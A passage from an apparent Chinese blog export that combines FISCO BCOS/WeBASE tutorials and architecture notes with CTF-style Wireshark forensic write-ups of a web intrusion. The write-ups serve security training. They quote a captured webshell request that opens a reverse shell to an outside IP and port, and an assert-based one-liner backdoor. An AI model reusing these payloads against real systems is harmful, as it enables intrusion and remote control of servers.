nodes/127.0.0.1/start_all.sh\n\n成功示例：\n\n搭建WeBASE-Front平台实现步骤：\n\n下载WeBASE-Front安装包\n配置WeBASE-Front\n启动WeBASE-Front\n\n命令如下：\n123456wget https://osp-1257653870.cos.ap- guangzhou.myqcloud.com/WeBASE/releases/download/v1.5.2/webase-front.zip unzip webase-front.zip cd webase-front cp -r ~/fisco/nodes/127.0.0.1/sdk/* ./conf/ bash start.sh\n\n示例区块链智能合约部署一、智能合约文件创建\n\n使用浏览器登录http://localhost:5002/WeBASE-Front网站\n\n点击“合约管理”-&gt;“合约IDE” ，新建智能合约，如右第一张图所示。\n\n在弹出对话框中输入合约名为“StringGetSet” ，文件目录为“&#x2F;” ，点击“确认“ ，查看文件导航栏是否有StringGetSet文件，如右第二张图所示。\n\n添加合约内容，具体代码访问链接：https://gitee.com/zhiguxingtu/demo8-back/blob/master/src/main/contracts/StringGetSet.sol\n\n\n\n\n二、创建用户、部署合约\n\n\n搭建应用程序后端基本框架并配置步骤如下：\n\nWeBASE-Front项目导出\n\n\n\nIDEA等编译工具项目导入\n\n\n通过WeBASE-Front-&gt; 合约IDE导出“StringGetSet”项目，如左下图所示。\n\n使用IDEA等开发软件导入StringGetSet项目，如右下图所示。\n\n在开发软件中对项目进行相关配置。\n\n\n\n\n配置Swagger UI\n\n\n配置build.gradle添加相关配置。\n\n如下图所示，在Config包中添加Swagger配置代码SwaggerConfig.java，代码如链接：https://gitee.com/zhiguxingtu/demo8-back/blob/master/src/main/java/org/example/StringGetSet/config/SwaggerConfig.java\n\n\n\n\n验证区块链功能\n\n使用Java SDK的方式调用智能合约\n\n创建controller包，并在controller包中添加StringGetSetController.java文件。\n\n编写StringGetSetController.java对应代码。\n\n启动项目，访问http://localhost:8080/swagger-ui.html查看并使用接口。\n\n\n开发基于WeBASE-Front API的应用程序接口应用接口开发流程\n\n添加接口开发相关依赖包文件\n编写的WeBASEFront的Controller接口\n开发基于WeBASE-Front的Service\n验证开发接口的正确性\n\n\n添加hutools依赖包\n在build.gradle引入hutools依赖包，代码如下：\n1implementation &#x27;cn.hutool:hutool-all:5.7.9&#x27;\n\n\n编写WeBASE API服务\n需要以下三个步骤：\n1、在service包中添加WeBASEService.java文件，以及在controller包中添加WeBASEController.java文件。\n2、编写WeBASEService.java对应代码。\n3、编写WeBASEController.java对应代码。\n\n验证接口开发结果\n通过浏览器访问：http://localhost:8080/swagger-ui.html\n\n1、使用newSet调用智能合约：\n在WeBASE管理平台，复制一个测试用户的地址。在newSet调用接口中复制该用户地址，并填写对应的值，点击”Try it out！“ 。\n\n2、使用newGet方法验证：\n用同样的方法打开newGet接口界面，并输入用户地址，点击”Try it out！“ 。\n\n\n开发并验证智能合约查询接口\n基于Get和Set开发模式，编写Controller与Service：\n\n在service包中的WeBASEService添加listDeployedContract函数，函数调用WeBASE API的合约查看接口（）\n\n在controller中的WeBASEController中添加list接口\n\n访问http://localhost:8080/swagger-ui.html验证\n\n打开接口直接点击“Try it out！” ，查看返回会有所有合约对应地址内容\n\n\n\n\n应用程序前端开发流程下载模板并安装依赖123456789mkdir -p ~/fisco/front-projectcd ~/fisco/front-projectgit clonehttps://gitee.com/zhiguxingtu/init-front.gitcp -r init-front demo8cd demo8npm install\n\n开发应用程序前端页面\n添加导航功能，创建components文件夹，在文件夹中创建Navigator.vue，编写相关代码。\n\n修改主页功能的views&#x2F;Home.vue相关代码。\n\n添加其他应用功能在views目录下创建SDK.vue和WeBASE.vue文件，并编写页面显示代码\n\n修改路由跳转文件router.js代码。代码地址：https://gitee.com/zhiguxingtu/demo8-front\n\n\n验证应用程序前端开发1、使用命令启动：\n• cd ~&#x2F;fisco&#x2F;front-project&#x2F;demo8\n• npm run serve\n2、访问：http://localhost:8020/#/home：\n【19】\n3、访问导航栏的“Java SDK”和“WeBASE”功能：\n\n\n\n实践尝试\n参照StringGetSet智能合约调用功能的页面布局，搭建MyGetSet智能合约的页面\n布局。包括内容：\n（1）Home页面开发\n（2）Java SDK和WeBASE页面开发\n（3）导航栏navigator开发\n（4）路由router.js的开发\n\n开发应用程序前端对应交互功能编写智能合约交互功能1、修改SDK.vue代码，添加Javascript调用后端代码，在&lt;script&gt;标签中添加methods，修改&lt;template&gt;标签中的内容。\n2、修改WeBASE.vue代码，添加Javascript调用后端代码，在&lt;script&gt;标签中添加methods，修改&lt;template&gt;标签中的内容。\n\n验证开发情况\n验证Java SDK智能合约调用情况\n\n（1）进入Java SDK导航，在“Set方法”的输入框输入“你好！” ，有如下返回：\n\n\n验证Java SDK智能合约调用情况\n\n（2）进入Java SDK导航，在“Get方法”调用“调用” ，有如下返回：\n\n\n验证WeBASE-Front API智能合约调用情况\n\n（1）进入WeBASE导航，在“账户地址”输入“test_user_1”的地址，模拟Java SDK的Get方法调用方法。\n验证基于WeBASE Front的智能合约交互功能示例：\n\n开发功能：获取所有智能合约并测试\n修改Home.vue，添加获取列出所有智能合约的方法。\n\n通过页面验证。\n\n\n\n","url":"2025/03/13/外部app与区块链进行交互/","date":"2025-03-13"},{"title":"关于架构","content":"企业架构  企业架构是企业进行项目决策的重要依据，同时也是支撑企业后续发展的重要基石。业务架构、数据架构、应用架构和技术架构是企业架构中的四个主要架构，它们在关注的方面和功能上有所不同，但是它们是相互关联和相互支持的，共同构成了企业的总体架构。\n企业架构之4A架构4A架构关键词：\n业务架构：战略，价值链，端到端，业务流程，业务组件，自上而下分解\n应用架构：系统建设，系统集成，中台，自下而上抽象\n技术架构：技术选型，框架，PaaS平台，云原生，DevOps，微服务，容器化，部署架构\n数据架构：数据标准，数据采集加工，数据入湖，数据治理，数据共享服务，数据安全，数据质量，数据架构\n【1】\n业务结构业务架构定义了业务策略、治理、组织和关键业务过程。是企业架构的核心内容，承接了企业战略，直接决定企业战略的实现能力，是其他架构领域工作的前置条件。\n主要目标是根据企业战略愿景，分析业务现状，识别现有业务能力及问题，提出业务改进需求，设计目标业务架构。（以价值链梳理分析业务开展流程，识别上下游依赖关系，从业务和产品的视角，描述整个平台或者产品的实现）\n设计步骤：\n\n识别战略，走访业务部门，问卷调查\n外部因素，根据宏观背景（风口），行业空间（天花板），竞争情况（赛道），上下游产业链做规划\n内部因素，根据商业模式，技术壁垒和资源投入进行规划\n\n如何绘制业务架构图\nA）根据用户操作流程，罗列功能模块\nB）形成功能矩阵\nC）横向分层，纵向分层\n应用架构应用架构为要部署的单个应用系统、它们之间的交互和它们与组织的核心业务流程之间的关系提供蓝图。\n工作主要目标是根据企业现状应用架构需求及业务架构中的数据流分析结果，设计目标应用架构（支持业务和数据处理需要哪些应用系统，完成从业务到IT的转换）\n设计步骤：\n\n根据业务架构图，做业务到IT的转换，识别应用程序和组件 （上接业务）\n优化应用程序和组件，该拆分就拆分，该聚合就聚合 （核心设计）\n设计应用与业务功能，流程，数据的关系（核心设计）\n设计应用集成，交互，开发 （下接开发）\n\n技术架构技术架构描述了需要支持业务、数据和应用服务的部署的逻辑软硬件能力，包括IT基础设施、中间件、网络、通信、流程、标准等。\n工作主要目标是基于现状技术架构、技术标准、业务&#x2F;应用&#x2F;数据架构要求，设计目标技术架构。梳理AS-IS技术架构，形成平台分解图和技术谱系目录。（支持应用系统所需的技术架构，技术组件，技术选型）\n设计步骤：\n\n根据应用架构，进行技术支撑分析，识别技术支撑的必要条件\n技术选型，包括开发架构，技术产品，开发技术栈，开发平台，运行平台\n技术影响分析，成本，难易度，规划，治理\n\n数据架构数据架构描述了企业逻辑物理数据资产和数据管理资源的结构。\n工作主要目标是根据企业现状数据架构需求及业务架构中的数据流转，设计目标数据架构。（描述企业数据来源，数据资产管理，数据治理，数据共享开放）\n设计步骤：\n\n上接业务，分析数据需求，识别数据类型，采集数据\n数据模型设计，概念模型（识别业务域），逻辑模型（实体关系ER），物理模型（表字段）\n数据治理，数据安全合规，数据质量管理\n数据共享开放，支撑业务决策，业务创新\n分析：根据数据应用层、数据接口层、数据层、数据采集层、数据源。\n\nB&#x2F;S架构定义：\n即 Browser&#x2F;Server（浏览器 &#x2F; 服务器）架构，是一种网络应用程序架构模式。（一种基于Web的系统架构，用户通过浏览器访问应用程序）\n特点：\n\n客户端轻量化： 用户不需要安装任何特定的客户端软件，只需使用标准的Web浏览器即可。\n易于部署和维护： 所有更新和维护工作都集中在服务器端进行，无需在每个客户端上操作。\n跨平台性： 只要有Web浏览器和网络连接，就可以从任何设备访问应用。\n\n架构组成客户端（浏览器）用户通过浏览器（如 Chrome、Firefox、Internet Explorer 等）来访问应用程序。浏览器负责向服务器发送请求，并接收和展示服务器返回的数据。这种方式无需在客户端安装专门的软件，只要有浏览器和网络连接，用户就可以随时随地访问应用。服务器端    1. Web 服务器：主要负责处理浏览器发来的 HTTP 请求，常见的 Web 服务器有 Apache、Nginx 等。它接收请求后，会根据请求的内容将相应的网页文件发送回浏览器，或者将请求转发给应用服务器处理。    2. 应用服务器：运行应用程序的业务逻辑。例如，处理用户登录验证、数据查询与处理、业务规则的执行等。常见的应用服务器有 Tomcat（主要用于 Java 应用）、IIS（用于ASP.NET应用）等。    3. 数据库服务器：用于存储应用程序的数据。它接收来自应用服务器的数据操作请求（如查询、插入、更新、删除等），并对数据库中的数据进行相应的操作。\n工作原理\n用户在浏览器中输入应用程序的 URL 地址，浏览器向 Web 服务器发送 HTTP 请求。\nWeb 服务器收到请求后，如果是静态网页请求（如 HTML、CSS、JavaScript 文件等），则直接将相应的文件返回给浏览器；如果是动态网页请求（如涉及到数据查询、业务逻辑处理等），则将请求转发给应用服务器。\n应用服务器处理业务逻辑，可能会与数据库服务器交互（查询数据、存储数据等），然后将处理结果生成动态网页内容返回给 Web 服务器。\nWeb 服务器将应用服务器返回的内容发送回浏览器，浏览器对收到的内容进行解析和渲染，展示给用户。\n\nC&#x2F;S架构定义：\n\nC&#x2F;S 架构，即 Client&#x2F;Server（客户端 &#x2F; 服务器）架构，是一种常见的软件架构模式。C&#x2F;S 架构是一种传统的分布式应用架构，它将应用程序分为客户端和服务器端两部分。\n客户端负责用户交互界面和一部分业务逻辑，服务器端则主要负责数据管理和核心业务逻辑。\n\n特点：\n\n功能丰富： 由于客户端可以安装专用的应用程序，因此可以提供更丰富的用户体验和功能。\n性能优势： 客户端可以利用本地计算资源进行一些计算密集型任务，减轻服务器压力。\n安全性： 相对于B&#x2F;S架构，C&#x2F;S架构可以通过客户端应用程序更好地控制数据安全。\n部署复杂度： 需要在每个客户端机器上安装、配置和更新软件，增加了维护成本。\n\n架构组成客户端（Client）\n客户端是安装在用户终端设备（如个人计算机、移动设备）上的软件。它主要负责向服务器发送请求、接收服务器返回的数据并进行展示和处理。例如，在一款银行客户端软件中，用户通过客户端界面输入账户查询、转账等操作指令，这些指令会被打包成请求发送给服务器。客户端软件通常具有良好的用户界面，能够根据用户操作和服务器返回的数据进行交互展示。\n服务器（Server）\n\n业务逻辑处理服务器：负责处理客户端发送过来的请求。\n它会根据应用程序的业务规则对请求进行分析和处理。[例如，在一个物流管理系统中，当客户端发送货物运输状态查询请求时，业务逻辑处理服务器会根据存储的物流数据（如货物的发货时间、运输路线、预计到达时间等）进行计算和判断，然后生成相应的结果。]\n\n\n\n\n数据存储服务器：主要用于存储应用程序所涉及的各种数据。这些数据包括用户信息、业务数据等。\n以电商平台为例，数据存储服务器存储了海量的商品信息（如商品名称、价格、库存等）、用户账户信息（如用户名、密码、收货地址等）和订单信息（如订单编号、下单时间、支付状态等）。它通过数据库管理系统来组织和管理这些数据，以便高效地响应服务器的查询和更新请求。\n\n\n工作原理\n用户通过客户端软件发起操作请求，例如在一个企业资源规划（ERP）客户端软件中，用户点击查询库存的按钮，客户端会将包含库存查询指令的请求发送给服务器。\n\n服务器收到请求后，业务逻辑处理服务器会根据请求的类型和具体内容进行处理。如果是库存查询请求，它会与数据存储服务器进行交互，从数据库中检索相关的库存数据。\n\n业务逻辑处理服务器将从数据存储服务器获取的数据进行处理和整合，生成客户端所需的结果。例如，将库存数据进行格式化，使其符合客户端软件的展示要求。\n\n服务器将处理后的结果返回给客户端，客户端接收到结果后，在软件界面上进行展示。如在库存查询的例子中，客户端会将收到的库存数量、产品名称等信息以表格或其他直观的形式显示在界面上，供用户查看。\n\n\n简述C&#x2F;S架构和B&#x2F;S架构的区别联系：\n都属于客户端-服务器架构：无论是B&#x2F;S还是C&#x2F;S架构，其核心都是将应用分为客户端和服务端两部分，客户端负责用户交互，服务端负责数据处理和存储。\n\n都需要网络连接：两种架构都需要通过网络来实现客户端与服务器之间的通信。\n\n都可以支持多用户访问：这两种架构都能够支持多个客户端同时连接到服务器上进行操作。\n\n\n区别：客户端形式不同：\nB&#x2F;S架构的客户端是浏览器，用户通过浏览器直接访问Web应用程序。C&#x2F;S架构的客户端是一个独立的应用程序，需要预先安装在用户的计算机上。\n维护成本不同：\n\nB&#x2F;S架构由于客户端统一为浏览器，因此维护相对简单，只需更新服务器端的应用程序即可。维护成本相对较低。例如，一个在线办公网站更新了文档编辑功能，用户再次通过浏览器访问时就能体验到新功能。\n\nC&#x2F;S架构可能需要在每个客户端机器上进行软件升级或维护工作，这增加了维护的成本和复杂度。维护成本较高。例如，如果企业使用的一款 C&#x2F;S 架构的财务软件需要更新功能，IT 人员需要逐一到每台装有该软件的计算机上去安装更新包。\n\n\n性能差异：\n\nB&#x2F;S架构依赖于浏览器的能力，对于复杂的业务逻辑和大量的数据处理可能不如C&#x2F;S架构高效。例如，一些 C&#x2F;S 架构的设计软件，在本地客户端上可以快速进行图形渲染等操作。\n\nC&#x2F;S架构可以利用客户端的计算能力，适合处理大量数据和复杂的图形界面，提供更好的用户体验。例如，一些 C&#x2F;S 架构的设计软件，在本地客户端上可以快速进行图形渲染等操作。\n\n\n安全性差异：\n\nB&#x2F;S架构中，所有数据和逻辑都在服务器端运行，这通常被认为更安全，因为不需要担心客户端上的数据泄露。但由于是通过浏览器访问，容易受到网络攻击，如跨站脚本攻击（XSS）、SQL 注入等，安全性保障相对复杂，需要采取多种网络安全措施来保护服务器和数据。例如，电商网站需要不断加强安全防护措施来防止用户信息泄露。\n\nC&#x2F;S架构可能面临客户端的安全问题，比如客户端软件被恶意篡改等风险。例如，企业内部的 C&#x2F;S 架构管理系统，可以通过设置严格的用户认证和权限管理机制来保障数据安全。\n\n\n可扩展性：\nB&#x2F;S架构更容易扩展，因为它只需要更新服务器端，而不需要对客户端进行任何修改。C&#x2F;S架构扩展时可能需要更新客户端软件，这可能会导致一定的延迟。\n平台兼容性：\n\nB&#x2F;S架构通常具有更好的跨平台兼容性，因为大多数浏览器都能运行标准的Web技术栈（如HTML、CSS、JavaScript）。例如，用户可以在任何操作系统的浏览器上访问同一个在线学习网站。\n\nC&#x2F;S架构可能需要针对不同的操作系统开发不同的客户端版本。例如，一个 C&#x2F;S 架构的游戏软件，若要在 Windows 和 Mac 系统上都能使用，开发团队可能需要分别为这两个操作系统开发对应的客户端版本。\n\n\n","url":"2025/01/10/关于架构/","date":"2025-01-10"},{"title":"平台维护","content":"从以太坊，Fabric，BCOS讲述\n以太坊平台维护以太坊简述1.账户体系两种账户：\n\n外部账户：由密钥控制\n\n合约账户： 由智能合约代码控制\n\n\n关于两种账户之间的区别：\n\n2. 货币机制和吞吐量\nETH在以太坊网络中主要是作为燃料货币使用，用于支付部署智能合约、调用智能合约时所消耗的燃料(gas)\n执行命令时，用户预支付费用：付款金额(单位wei) &#x3D; gas数量 * gasPrice\ngasLimit：规定最大的 gas 消耗数量\n\n\n\n如果 gas &gt; gasLimit，消耗的gas不会退回发起的账号（尽可能设置一个较大的gasLimit，当实际消耗的gas小于gasLimit时，多余的gas会退还给发起者）。\n\n交易吞吐量：区块链中每秒能够处理通过的交易数量(交易吞吐量 = 交易数量 / 每秒 = (gasLimit / gas)/ 出块速度)\n\n· 以太坊平均出块速度：15秒\n· 以太坊主网 gasLimit（以太坊的区块容量）：6771518\n· 发送支付交易 gas 数量：21000\n\n\n   （最小的 gas 消耗）\n· 以太坊上交易吞吐量为每秒21笔\n\n\n影响吞吐量的因素：\n• 区块大小\n• 出块速度\n\n\n以太坊维护以太坊基本命令\ngeth命令\n\n\nbootnode 命令\n\n\nbootnode可以用于启动引导节点关联以太坊网络中的geth节点；\n\n\n一般可以使用bootnode -genkey命令生成节点密钥，再通过bootnode -nodekye命令显示enode信息作为其他节点连接时设置的参数\n\npuppeth 命令工具 ——以太坊私有网络的管理工具\n以太坊控制台命令\n以太坊接口交互\nHyperledger Fabric 平台维护\n加入新通道\n在通道中部署chaincode\n在通道中加入新的组织\n更改通道中配置内容改变通道性能\n\nHyperledger Fabric 联盟链工具命令 peer\n\npeer 命令用于操作 Fabric 网络中除了 orderer 节点以外的 peer 节点，包含 peer channel、peer lifecycle chaincode、peer node 等子命令。\n\n在 peer 命令执行时会读取对应的 core.yaml 配置文件，通过配置FABRIC_CFG_PATH环境变量定义。\n\n连接任意peer节点时需要配置环境变量获取管理员权限执行操作\n\n\n\npeer node\n\n\n\npeer channel\n\n\n\n\npeer lifecycle chaincode\n\n\n\nHyperledger Fabric 联盟链维护\nFISCO BCOS 平台维护build_chain.sh 脚本•开发部署工具：\nbuild_chain.sh 脚本：帮助用户快速搭建 FISCO BCOS 联盟链\n•运维部署工具\nFISCO BCOS generator ：为企业用户提供部署、管理和监控多机构多群组联盟链的便捷工具\n更多功能介绍参考:https://fisco-bcosdocumentation.readthedocs.io/zh_CN/latest/docs/manual/build__chain.html\n\n\nFISCO BCOS generator\nFISCO BCOS generator 为企业用户提供了部署、管理和监控多机构多群组联盟链的便捷工具\n\n基本功能\nWeBASE 平台WeBASE（WeBank Blockchain Application Software Extension） 是在区块链应用和底层节点之间搭建的中间件平台，提供节点前置、私钥托管和签名、节点管理和 WeBASE Web 端等服务。\n\n总结\n","url":"2025/01/17/平台维护/","date":"2025-01-17"},{"title":"流量分析题解3","content":"黑客攻击IP是多少来源：数据采集D_eth0_NS_20160809_164452.pcap\n答案：183.129.152.140\n解答：过滤http contains “404” 发现黑客进行了目录扫描\n\n在分析数据包时，发现183.129.152.140对172.16.60.197和172.16.61.206的爆破密码和目录&#x2F;文件的操作，判断此IP为黑客攻击IP\nOA服务器内网IP是什么答案: 172.16.61.199  \n来源：数据采集H_eth0_NS_20160809_172819.pcap\n分析步骤:\n\n过滤条件: http contains &quot;oa&quot;\n在包285中可以查看到oa.t3sec.cc字样, 查看包的目标地址是172.16.61.199\n\n\n黑客使用了什么扫描器进行扫描？（缩写，大写）答案: AWVS  \n来源：数据采集D_eth0_NS_20160809_164452.pcap\n分析步骤:\n\n过滤条件: http &amp;&amp; ip.addr==183.129.152.140\n在数据包574381中发现了请求头有awvs的指纹：（acunetix）\n\n\n黑客给哪2个帐号发送了钓鱼邮件？（逗号隔开）答案: &#105;&#x74;&#64;&#x74;&#x33;&#x73;&#101;&#x63;&#x2e;&#x63;&#x63;,&#x6c;&#105;&#x78;&#105;&#97;&#x6f;&#x66;&#x65;&#x69;&#64;&#116;&#51;&#115;&#x65;&#99;&#46;&#99;&#99;分析步骤:\n\n过滤SMTP协议(设置过滤条件为smtp)\n发现发送方&#120;&#115;&#115;&#x65;&#114;&#x40;&#x6c;&#105;&#x76;&#x65;&#x2e;&#x63;&#x6e;向这两个账号发送邮件\n\n\n黑客使用哪个邮件钓鱼邮件答案: &#x78;&#x73;&#x73;&#x65;&#x72;&#x40;&#108;&#105;&#x76;&#101;&#46;&#99;&#110;分析步骤: 思路：利用邮件协议，进行关键字过滤\n查看FROM字段是  &#x78;&#x73;&#115;&#x65;&#x72;&#x40;&#108;&#105;&#118;&#x65;&#x2e;&#x63;&#110; (return-path）\n\n\n黑客对哪个参数进行了注入并成功来源：数据采集H_eth0_NS_20160809_170930.pcap\n答案: name分析步骤:\n\n过滤条件: http.request.full_uri contains &quot;SELECT&quot;\n发现黑客使用sqlmap对name参数注入\n\n\n账号密码的加密方式是什么？（大写）思路：搜索关键字，根据之前上传的webshell来进行推断\n来源：数据采集H_eth0_NS_20160809_170930.pcap\n答案：MD5\n解答：在数据包中发现了黑客使用sqlmap进行了注入攻击，过滤http contains &quot;password&quot; 可以查看注入密码的请求和响应，查看其中的一个响应包(例如478036)，查看内容可以推测是使用了MD5加密（一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值， 不可逆 的加密算法，不可逆加密算法的特征是 加密过程中不需要使用密钥，位数固定）\n\nWebShell权限是什么思路：过滤关键字whoami，getshell后黑客会进行提权，会对当前的系统进行提权\n来源：数据采集H_eth0_NS_20160809_172819.pcap\n答案：apache\n解答：设置过滤条件tcp contains whoami\n在数据包189424中发现黑客执行命令whoami的返回包，权限为apache\n\n内网数据库IP地址是多少来源：数据采集H_eth0_NS_20160809_172819.pcap\n答案：172.16.60.195\n解答：猜测黑客通过之前的webshell连接数据库，设置过滤条件为http contains &quot;20160809092842.php&quot;\n在包211320中发现黑客连接数据库操作，其中ip为172.16.60.195\n\nOA数据库用户名是什么答案: root分析步骤: 过滤ip.addr==172.16.60.195 &amp;&amp; mysql追踪TCP流就可以看见\n\n黑客使用了哪个页面的漏洞获取了webshell(填写文件名即可)\n来源:数据采集D_eth0_NS_20160809_171230.pcap\n答案：upload.php\n解答：继续搜索webshell的文件名，设置过滤条件为http contains “20160809092842.php”\n \n跟踪第一个请求的tcp流，可以看到是通过upload.php来上传的。\n（第七排referer——ac&#x3D;upload）\n\n\n\n答案: /* angel 2013*/\nWebShell密码是多少（明文）来源：数据采集H_eth0_NS_20160809_172819.pcap\n答案：angel\n解答：设置过滤条件为http contains &quot;20160809092842.php&quot;\n在包169940中发现，登陆后门操作，密码为angel\n\n黑客下载了哪几个数据库来源：数据采集D_eth0_NS_20160809_172831.pcap\n答案：oa.sql,crm.sql\n解答：设置过滤条件为http contains &quot;.sql&quot;。可以看到黑客使用了phpspy的备份数据库功能。最后在20160809这个目录下载了2个数据库备份文件\n\n黑客遗漏的后门是如何编写最短代码来执行phpinfo的来源：数据采集H_eth0_NS_20160809_172819.pcap\n答案：a&#x3D;assert&amp;b&#x3D;phpinfo()\n解答：设置过滤条件为http contains &quot;20160809092842.php&quot;。在278800包中发现一句话后门内容\n(后门：隐藏通道；\n\n这个后门接受两个参数，a作为函数名，b作为执行的参数\n\n黑客对哪些email进行了爆破来源：数据采集D_eth0_NS_20160809_164452.pcap\n答案：&#105;&#116;&#x40;&#116;&#51;&#x73;&#x65;&#99;&#46;&#99;&#x63;\n解答：过滤黑客的ip和mail关键字 尝试查找和email爆破相关的信息\n设置过滤条件为ip.addr eq 183.129.152.140 and http contains &quot;mail&quot;\n在前半部分可以发现很多的登陆请求，仔细查看后这些包属于扫描器对目标的随机测试。\n\n\n黑客向哪个ip反弹了一个shell来源：数据采集H_eth0_NS_20160809_172819.pcap\n答案：118.193.179.201\n解答：设置过滤条件为http contains &quot;20160809092842.php&quot;\n在372776包中发现黑客通过webshell发起了一个反弹shell的指令，ip为118.193.179.201\n\n第二种方法在PhpSpy大马中有backconnect反弹功能。搜索使用这个功能的地方，在D172831中第264063个包中找到：\n123456789101112131415161718192021222324/data/uploadfile/1/20160809/20160809092842.php HTTP/1.1Host: oa.t3sec.cc:8082User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://oa.t3sec.cc:8082/data/uploadfile/1/20160809/20160809092842.phpCookie: my_expand_3=2%2C1%2C; PHPSESSID=lq5vn8k9fe72pnsffjv35ljj71; po_auth=MQkwOWZiY2U0NjU1NDEwYmMwM2JhZmExZDExZjc2ODQ3NQ%3D%3D; loginpass=ec38fe2a8497e0a8d6d349b3533038cbConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 95act=backconnect&amp;cwd=%2Fvar%2Fwww%2Fhtml%2F&amp;p1=start&amp;p2=118.193.179.201&amp;p3=9090&amp;p4=c&amp;charset=gbk\n\n前面的TCP流中，可以找到这个功能的WEB界面：\n\n还有其他网站也能找到：\n\n同样，到处html查看信息得到ip和端口\n\n黑客预留的后门文件名是什么来源：数据采集H_eth0_NS_20160809_172819.pcap\n答案：admin.bak.php\n解答：设置过滤条件为http contains &quot;20160809092842.php&quot;\n在278800包中发现一句话后门内容\n\n可以看到后门的文件名为admin.bak.php\n","url":"2025/04/28/流量分析题解3/","date":"2025-04-28"},{"title":"流量分析题解1","content":"\n原题分析链接：http://t.csdnimg.cn/slyXZ\n\n方法提取（关键字搜索的图标或者直接ctrl+f)\n在Wireshark中，当你看到“value处的truncated”时，这通常意味着数据包中的某个字段或值在捕获时被截断，未能完整显示。\n题目：01 黑客登录系统使用的密码是______？\n02 黑客修改了一个日志文件，文件的绝对路径为______？（请确认绝对路径后再提交）\n03 黑客获取webshell之后，权限是______？\n04 黑客写入的webshell文件名是______？(请提交带有文件后缀的文件名，例如x.txt)\n05 黑客上传的代理工具客户端名字是______？如有字母请全部使用小写）\n06 黑客代理工具的回连服务端IP是______？\n07 黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。\n题解：*01 黑客登录系统使用的密码是______？*\n过滤器处输入“http.request.method&#x3D;&#x3D;”POST””也可直接检索(login)\n找到有该字样的流量\n \n查看可得\n \n所以密码是Admin123!@#\n*02 黑客修改了一个日志文件，文件的绝对路径为______？（请确认绝对路径后再提交）*\n*在分组字节流搜索.log*\n找到如图流量\n \n*Tpl处即为绝对路径*\n \n尝试追踪流——http流\n \n得到了浏览器的绝对路径&#x2F;var&#x2F;www&#x2F;html\n所以文件的绝对路径是：&#x2F;var&#x2F;www&#x2F;html&#x2F;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log\n*03 黑客获取webshell之后，权限是______？*\n在分组字节流搜索whoami\n找到tcp流下一个http流（此处需要多找几次）\n \n找到权限为www-data\n*04 黑客写入的webshell文件名是______？(请提交带有文件后缀的文件名，例如x.txt)*\n在第二题的寻找过程可以查找到\n \n所以写入的webshell文件名是：1.php\n*05 黑客上传的代理工具客户端名字是______？如有字母请全部使用小写）*\n由第三题过程中可以看到webshell的连接密码为aaa\n \n搜索aaa然后追踪http流\n \n找到09:42:32这条 即为客户端名字\n \n*06 黑客代理工具的回连服务端IP是______？*\n将第五题的http流复制\n \n粘贴在burp ——编码工具——解码选择ascll十六进制数\n \n所以ip是192.168.239.123\n*07 黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。*\n同样是第五题的http流，复制一下从第三排“a&#x3D;”后面一直到红字结束\n \n粘贴到burp,同样方法解码\n \n所以账号：0HDFt16cLQJ\n​    密码：JTN276GP\n","url":"2025/04/25/流量分析题解/","date":"2025-04-25"},{"title":"流量分析题解2","content":"实验预设问题：1.攻击者的IP地址为？2.网站的后台管理员登陆界面的URL是？3.网站数据库的名称为？4.网站后台管理员admin的登陆密码哈希值为？5.黑客进入后台使用的漏洞是？Payload是？6.黑客通过什么Web攻击方法获得权限？7.黑客上传的Webshell文件名是？8.黑客上传的Webshell在使用时需要接收的参数是？9.黑客的远程服务器地址是？\n题解任务一：排查攻击者IP地址步骤一：协议分级统计    首先需要对流量包进行基本分析。在WireShark菜单栏中点击【统计-&gt;协议分级】。\n\n协议分级会对流量包根据TCP&#x2F;IP协议簇定义的协议层级进行分级，并对不同协议类型的流量进行统计。\n\n效果如下：    \n​\t\n在协议分级统计中可以看到，应用层中涉及的协议主要是HTTP协议，可以初步判断该攻击事件为Web攻击事件。\n步骤二：会话统计    在WireShark菜单栏中点击【统计-&gt;Conversations】。\n\n会话统计会对流量包中不同网络地址之间的通信流量进行统计。\n\n效果如下：\n\n\n  这里查看IPV4流量的统计信息，可以看到在该流量包中主要是172.17.0.1和172.17.0.2之间的通信流量占绝大部分，可以初步怀疑这两个IP中的一方是攻击者IP，另一方是受害主机IP。\n步骤三：流量筛选分析    已知攻击事件为Web攻击，可以在WireShark的显示过滤器中过滤HTTP流量。\n        可以看到172.17.0.1对172.17.0.2发起了大量HTTP请求，同时这些HTTP请求具有明显的网站后台目录扫描行为特征。    所以得到攻击者IP地址为【172.17.0.1】。\n任务二：攻击行为分析步骤一：后台目录Fuzz阶段分析到现在我们已经可以确定172.17.0.1为攻击者IP，并且针对服务器A的Web应用进行攻击。那么接下来就要梳理其攻击过程，这里通过流量包进行分析。\n​\t我们可以直接过滤攻击者IP相关的HTTP协议流量进行排查。在WireShark显示过滤器中使用以下过滤规则：ip.addr==172.17.0.1 &amp;&amp; http\n\n容易发现，起初攻击者在针对Web站点的目录进行Fuzz，试图找出Web站点现有的Webshell、后台管理地址等敏感目录，特征也很明显，在第60284个流量包之前的所有HTTP请求都是针对Web敏感目录的GET请求，且服务器返回的响应绝大多数都是404 Not Found。\n\n步骤二：后台登陆界面口令爆破攻击分析第60284个流量包是明显的分界点，在这个流量之后，攻击者开始针对Web应用的&#x2F;admin目录进行攻击，按照一般逻辑这个&#x2F;admin目录应该是攻击者在进行目录Fuzz时 爆破出来的管理员地址。frame.number&gt;=60284 &amp;&amp; http\n​\t攻击者首先是尝试访问了&#x2F;admin这一地址，然后被302重定向到了&#x2F;admin&#x2F;login.php，显然是需要管理员账户密码和验证码的。\n\n于是攻击者首先针对后台管理员登录页面进行口令爆破（从流量包No.60522开始）。这里可以关注一点，在口令爆破阶段，攻击流量的数据包长度都在830字节左右。frame.number&gt;=60522 &amp;&amp; http\n\n爆破失败的回显结果也都是如下，该相应的数据包长度均为1202字节\n\n步骤三：后台登陆界面SQL注入攻击    